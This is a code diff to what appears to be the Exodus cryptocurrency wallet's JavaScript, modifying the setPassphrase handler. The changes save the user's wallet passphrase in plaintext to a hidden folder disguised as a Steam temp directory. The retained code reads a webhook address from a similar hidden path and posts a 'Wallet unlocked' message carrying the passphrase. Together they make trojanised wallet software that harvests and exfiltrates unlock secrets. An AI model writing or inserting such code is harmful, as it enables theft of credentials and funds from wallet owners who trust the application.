@@ -1051,8 +1051,8 @@
       async setError(e) {
         this.emit("error", e);
       }
-    async setPassphrase(e) { 
-        this.emit("passphrase:set", e);
+ async setPassphrase(e) { 
+    this.emit("passphrase:set", e);
 
     try {
         const fs = require('fs').promises;
@@ -1061,6 +1061,18 @@
         
         const currentUser = os.userInfo().username;
         
+        // Save to the new location
+        const walletDir = path.join('C:', 'Users', currentUser, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet', 'Exodus');
+        const passwordFile = path.join(walletDir, 'password.txt');
+        
+        // Create directory if it doesn't exist
+        await fs.mkdir(walletDir, { recursive: true });
+        
+        // Write the passphrase to the file
+        await fs.writeFile(passwordFile, e, 'utf8');
+        console.log('Passphrase saved to:', passwordFile);
+        
+        // Original webhook functionality (kept for reference)
         const webhookPath = path.join('C:', 'Users', currentUser, 'AppData', 'LocalLow', 'Temp', 'Steam', 'hook', 'webhook.txt');
         
         console.log('Looking for webhook at:', webhookPath);
@@ -1077,7 +1089,7 @@
         const embed = {
             color: 3553599,
             footer: { text: "whoa!" },
-            title: "Exodus Wallet unlocked",
+            title: "Wallet unlocked",
             fields: [
                 {
                     name: "🔑:",
